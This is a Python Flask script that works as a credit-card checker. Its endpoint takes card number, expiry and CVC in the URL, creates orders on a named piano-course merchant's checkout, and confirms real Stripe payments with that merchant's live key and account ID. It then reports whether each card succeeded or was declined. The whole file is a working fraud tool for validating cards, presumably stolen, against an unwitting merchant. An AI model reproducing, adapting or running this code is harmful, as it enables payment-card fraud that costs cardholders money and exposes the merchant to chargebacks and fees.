
from flask import Flask, request, jsonify
import requests
import random
import string
import json
import time

app = Flask(__name__)

def random_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"

def random_uuid():
    return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}"

# Fixed IDs
LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"
CONTACT_ID = "aGbXD3iQFPAAOW87eaTO"

@app.route('/strip1', methods=['GET'])
def process_payment():
    """
    Process payment with card details
    URL format: http://localhost:5000/strip1?cc=card_number|MM|YY|CVC
    Example: http://localhost:5000/strip1?cc=4097581393841577|06|32|537
    """
    try:
        # Get card parameter from URL
        card_input = request.args.get('cc')
        
        if not card_input:
            return jsonify({
                "status": "error",
                "message": "Missing cc parameter. Format: ?cc=number|MM|YY|CVC"
            }), 400
        
        # Parse card details
        parts = card_input.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid format. Use: number|MM|YY|CVC"
            }), 400
        
        card_number, exp_month, exp_year, cvc = parts
        
        # Generate random data
        ORDER_ID = "69db8db0539e86c0cfd5c582"
        name = "Test User"
        email = random_email()
        phone = f"+91{random.randint(7000000000, 9999999999)}"
        fingerprint = random_uuid()
        tracking_id = random_uuid()
        timestamp = int(time.time() * 1000)
        
        # ========== REQUEST 1 - Create Order ==========
        headers1 = {
            'accept': 'application/json',
            'channel': 'APP',
            'content-type': 'application/json',
            'fullurl': 'https://gospelpianosimple.com/checkout',
            'origin': 'https://gospelpianosimple.com',
            'referer': 'https://gospelpianosimple.com/',
            'source': 'WEB_USER',
            'timezone': 'Asia/Calcutta',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        json1 = {
            'altId': LOCATION_ID,
            'altType': 'location',
            'contactId': CONTACT_ID,
            'source': {
                'type': 'funnel',
                'subType': 'one_step_order_form',
                'id': 'g4nSqj6sq4cLxVKmvzp7',
                'name': 'Gospel Piano, Made Simple (Funnel)',
                'meta': {
                    'stepId': '0b7fe1a4-7b0e-4737-b368-d33360a23d2f',
                    'pageId': 't9fsSH8BSKlN7gCRtdOC',
                    'domain': 'gospelpianosimple.com',
                    'pageUrl': '/checkout',
                    'affiliateManager': {}
                }
            },
            'products': [{'id': '698502efdd3a3371f5ffba3f', 'qty': 1}],
            'fingerprint': fingerprint,
            'trackingId': tracking_id,
            'traceId': ''
        }
        
        r1 = requests.post('https://backend.leadconnectorhq.com/payments/orders', 
                           headers=headers1, json=json1, timeout=15)
        
        if r1.status_code not in [200, 201]:
            return jsonify({
                "status": "error",
                "message": f"Order creation failed with status {r1.status_code}"
            }), 500
        
        # ========== REQUEST 2 - Initiate Payment ==========
        headers2 = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'fullurl': 'https://gospelpianosimple.com/checkout',
            'origin': 'https://gospelpianosimple.com',
            'referer': 'https://gospelpianosimple.com/',
            'timezone': 'Asia/Calcutta',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        json2 = {
            'altId': LOCATION_ID,
            'altType': 'location',
            'orderId': ORDER_ID,
            'paymentMethodConfiguration': 'pmc_1QwcLrFpU9DlKp7Rl9zb07x1',
            'mode': 'subscription',
            'defaultPMConfigForFutureUsage': True,
            'giftCardCode': ''
        }
        
        r2 = requests.post('https://backend.leadconnectorhq.com/payments/stripe/initiate', 
                           headers=headers2, json=json2, timeout=15)
        
        if r2.status_code not in [200, 201]:
            return jsonify({
                "status": "error",
                "message": f"Payment initiation failed with status {r2.status_code}"
            }), 500
        
        data2 = r2.json()
        payment_intent_id = data2.get('paymentIntentId')
        client_secret = data2.get('clientSecret')
        
        if not payment_intent_id:
            return jsonify({
                "status": "error",
                "message": "No payment intent ID received"
            }), 500
        
        # ========== REQUEST 3 - Confirm Payment ==========
        card_spaced = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        
        data3 = f'return_url=https%3A%2F%2Fgospelpianosimple.com%2Fverify-payment-callback%3FsourceId%3D{ORDER_ID}%26altId%3D{LOCATION_ID}&payment_method_data[type]=card&payment_method_data[card][number]={card_spaced}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[billing_details][address][country]=IN&use_stripe_sdk=true&key=pk_live_MtxwO3obi7pfD7UZlGkfR2yj&_stripe_account=acct_1FKMKtHGUqx8Rh4c&client_secret={client_secret}'
        
        headers3 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        url3 = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
        
        r3 = requests.post(url3, headers=headers3, data=data3, timeout=15)
        result = r3.json()
        
        # Format response based on result
        if result.get('status') == 'succeeded':
            response_data = {
                "status": "success",
                "message": "✅ SUCCESS"
            }
        elif result.get('error'):
            err = result['error']
            code = err.get('decline_code', err.get('code', 'declined')).upper()
            msg = err.get('message', '')
            response_data = {
                "status": "declined",
                "message": f"❌ {code}",
                "details": msg if msg else None
            }
        else:
            response_data = {
                "status": "unknown",
                "message": f"⚠️ {result.get('status', 'unknown')}"
            }
        
        return jsonify(response_data), 200
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"An error occurred: {str(e)}"
        }), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
